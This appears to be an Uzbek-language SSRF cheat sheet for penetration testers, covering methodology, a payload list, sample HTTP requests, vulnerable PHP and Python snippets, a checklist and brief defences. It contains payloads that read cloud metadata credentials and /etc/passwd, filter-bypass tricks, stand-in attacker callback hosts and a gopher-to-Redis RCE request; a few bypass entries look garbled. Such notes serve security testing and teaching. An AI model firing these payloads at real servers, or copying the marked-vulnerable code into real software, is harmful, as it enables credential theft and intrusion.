# Server-Side Request Forgery (SSRF)

## 1. Ta'rif
SSRF — server foydalanuvchi bergan URL'ni o'zi so'rab, natijani qaytaradi. Attacker ichki tarmoqqa / metadata / internal service'ga erishadi (127.0.0.1, 169.254.169.254, 10.x).

## 2. Qayerdan kelib chiqadi
- `url=` param uchinchi tomonning URL'ini ochadi (webhook, preview, import, image fetch)
- `POST /validate` `curl`/`file_get_contents`/`requests.get` singari
- PDF/HTML rendering, SSO/SAML fetch, RSS feed parser, include remote
- X-Forwarded-For / Referer / Host ichkilikda ishlatilsa
- Import/export (URL based data import)

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| Basic (full response) | Response'da to'liq javob qaytariladi |
| Blind | Response'da hech narsa, lekin ichki so'rov bo'ladi |
| Semi-blind | Status/code farqi bor (time-based) |

## 4. Metodologiya
1. URL input qayerda? Endpoint aniqlash: `image?url=`, `proxy`, `fetch`, `webhook`, `preview`.
2. External isbot: `http://attacker.dnslog.cn/x` — DNS/HTTP callback (Collaborator).
3. Local: `http://127.0.0.1:80`, `http://localhost`, `http://0.0.0.0`.
4. Metadata (AWS/GCP/Azure/OpenStack):
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`
   - AliCloud: `http://100.100.100.200/latest/meta-data/`
5. Internal port scan: `http://127.0.0.1:PORT/` — 80,8080,443,6379 (redis),3306,9200...
   - Response farqi: port open vs closed.
6. Bypass filtrlari:
   - IP boshqa format: decimal `2130706433`, octal, ipv6 `[::1]`, `127.0.0.1.nip.io`, `spoofed.burpcollaborator.net`
   - URL parse bypass: `http://google.com@127.0.0.1`, `http://127.0.0.1#@google.com`
   - Redirect: o'zi 302 beradigan `http://attacker/redir` → target
   - DNS rebinding, `0.lasdreldcwlln`, `user:pass@host`
   - Protocol bypass blockchain: `gopher://`, `dict://`, `http://` → file://; `file:///etc/passwd`
7. Gopher → Redis/FastCGI/Memcached RCE (internal).
8. Response'da yashil javob → XML/HTML parse qilinsa XXE kombinatsiyasi.

## 5. Payload'lar
```
http://127.0.0.1/
http://localhost:8080/
http://0.0.0.0/
http://[::1]/                 # IPv6 local
http://169.254.169.254/latest/meta-data/   # AWS
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://100.100.100.200/latest/meta-data/iam/security-credentials/   # Aliyun
http://10.0.0.1/admin
http://2130706433/            # 127.0.0.1 decimal
http://0x7f000001/            # hex
http://0177.0.0.1/            # octal
http://127.0.0.1.nip.io/
http://localtest.me/
http://user@127.0.0.1/
http://127.0.0.1:8080@evil.com
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO          # Redis
dict://127.0.0.1:6379/INFO
```

## 6. Request misollari
```
POST /api/fetch HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/root"}

GET /webhook?url=http://localhost:6379/info HTTP/1.1
Host: target.com

# gopher redis RCE
POST /api/hook HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=gopher://localhost:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$54%0d%0a...
```

## 7. Zaif code misollari
```php
// ZAIF
$url = $_GET['url'];
$data = file_get_contents($url);
echo $data;

// Python — ZAIF
url = request.args.get("url")
r = requests.get(url)
return r.text

// XAVFSIZ (tegmasdan)
// - whitelist: faqat ma'lum domain oq ro'yxat
// - IP parse qilib private IP tekshirish
// - DNS rebinding qarshi double-resolve
```

## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Response qaytadimi yoki blind — ikkalasi ham report qilinadi
- [ ] Redirect'lar sinash (curl -L behavior)
- [ ] Metadata IAM creds — request'da qanday header kerak (GCP: `Metadata-Flavor: Google`)
- [ ] Schema/IP filterlar — yana yuqoridagi bypass'lar
- [ ] CRLF bilan request spliting
- [ ] Blind bo'lsa: SQL/pg internal, redis, elasticsearch hujum
- [ ] PDF render / svg import — file leak
- [ ] Internal dashboard/port (grafana, k8s dashboard, AWS metadata)

## 9. Himoya
- Server-side URL allowlist (tegishli esquema + domain), private IP bloklash (IPv4+IPv6)
- DNS rebinding oldini: resolve qilish, IP tekshirish, qayta resolve
- Redirect'ga ruxsat bermaslik, SSRF guard/SDK
- Response'ni clientga qaytarmaslik (blind)